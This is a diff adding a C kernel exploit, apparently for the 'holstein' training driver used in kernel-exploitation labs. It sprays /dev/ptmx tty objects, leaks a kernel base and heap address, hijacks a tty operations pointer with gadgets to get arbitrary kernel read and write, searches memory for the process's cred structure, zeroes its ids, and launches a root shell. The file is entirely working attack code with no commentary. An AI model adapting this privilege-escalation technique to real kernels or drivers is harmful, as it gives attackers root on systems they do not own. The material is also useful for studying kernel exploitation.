@@ -1,0 +1,184 @@
+#include <fcntl.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/prctl.h>
+#include <unistd.h>
+
+int fd;
+int tty[100];
+int target = 0;
+
+uintptr_t offset;
+#define OFFSET(addr) (addr + offset)
+
+uintptr_t g_buf;
+
+uintptr_t mov_prdx_rcx	= 0xffffffff811b7dd6;
+uintptr_t mov_rax_prdx	= 0xffffffff813a5f29;
+
+static void leak_offset_and_g_buf(void)
+{
+	uint8_t data[0x440];
+
+	read(fd, data, 0x440);
+	offset = *(uintptr_t *)&data[0x418] - 0xffffffff81c38880;
+	printf("[+] offset %p\n", offset);
+
+	g_buf = *(uintptr_t *)&data[0x438] - 0x438;
+	printf("[+] g_buf %p\n", g_buf);
+}
+
+static uint32_t aar32(uintptr_t ptr)
+{
+	uint32_t data;
+
+	if (target) {
+		data = ioctl(target, 0, ptr);
+	} else {
+		for (int i = 0; i < 100; ++i) {
+			data = ioctl(tty[i], 0, ptr);
+			if (data != -1) {
+				target = tty[i];
+				break;
+			}
+		}
+	}
+
+	return data;
+}
+
+static uintptr_t search_cred(void)
+{
+	uint8_t name[16] = "$this_is_evil_$";
+	uintptr_t ptr = g_buf - 0x1000000;
+	uint8_t data[0x420];
+	uintptr_t cred;
+	uint32_t tmp;
+
+	if (prctl(PR_SET_NAME, name) == -1) {
+		perror("[-] prctl");
+		return -1;
+	}
+
+	read(fd, data, 0x420);
+	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_rax_prdx);
+	*(uintptr_t *)&data[0x418] = g_buf;
+
+	write(fd, data, 0x420);
+
+	while (true) {
+		if (ptr >= g_buf)
+			return -1;
+
+		tmp = aar32(ptr);
+		if (tmp != *(uint32_t *)name) {
+			ptr += 8;
+			continue;
+		}
+
+		tmp = aar32(ptr + 4);
+		if (tmp != *(uint32_t *)&name[4]) {
+			ptr += 8;
+			continue;
+		}
+
+		tmp = aar32(ptr + 8);
+		if (tmp != *(uint32_t *)&name[8]) {
+			ptr += 8;
+			continue;
+		}
+
+		tmp = aar32(ptr + 12);
+		if (tmp != *(uint32_t *)&name[12]) {
+			ptr += 8;
+			continue;
+		}
+
+		break;
+	}
+
+	cred = (uintptr_t)aar32(ptr - 4) << 32;
+	cred += aar32(ptr - 8);
+
+	return cred;
+}
+
+static void aaw(uintptr_t ptr, uint8_t *buf, size_t count)
+{
+	uint8_t data[0x420];
+	size_t left = count;
+	uint32_t tmp;
+
+	read(fd, data, 0x420);
+	*(uintptr_t *)&data[0x0c * 8] = OFFSET(mov_prdx_rcx);
+	*(uintptr_t *)&data[0x418] = g_buf;
+
+	write(fd, data, 0x420);
+
+	for (int i = 0; i < count; i += 4, left -= 4) {
+		tmp = 0;
+		memcpy(&tmp, buf + i, left >= 4 ? 4 : left);
+
+		if (target) {
+			ioctl(target, tmp, ptr + i);
+		} else {
+			for (int j = 0; j < 100; ++j) {
+				if (ioctl(tty[j], tmp, ptr + i) != -1) {
+					target = tty[j];
+					break;
+				}
+			}
+		}
+	}
+}
+
+int main(void)
+{
+	uintptr_t cred;
+
+	for (int i = 0; i < 50; ++i) {
+		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+		if (tty[i] == -1) {
+			perror("[-] open");
+			return EXIT_FAILURE;
+		}
+	}
+
+	fd = open("/dev/holstein", O_RDWR);
+	if (fd == -1) {
+		perror("[-] open");
+		return EXIT_FAILURE;
+	}
+
+	for (int i = 50; i < 100; ++i) {
+		tty[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+		if (tty[i] == -1) {
+			perror("[-] open");
+			return EXIT_FAILURE;
+		}
+	}
+
+	leak_offset_and_g_buf();
+
+	printf("[+] searching cred ...\n");
+	cred = search_cred();
+	if (cred == -1) {
+		printf("[-] cred not found\n");
+		return EXIT_FAILURE;
+	} else {
+		printf("[+] cred %p\n", cred);
+	}
+
+	for (int i = 0; i < 8; ++i)
+		aaw(cred + (i + 1) * 4, "\x00\x00\x00\x00", 4);
+
+	printf("[+] get r00t!\n");
+	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
+
+	close(fd);
+	return EXIT_SUCCESS;
+}
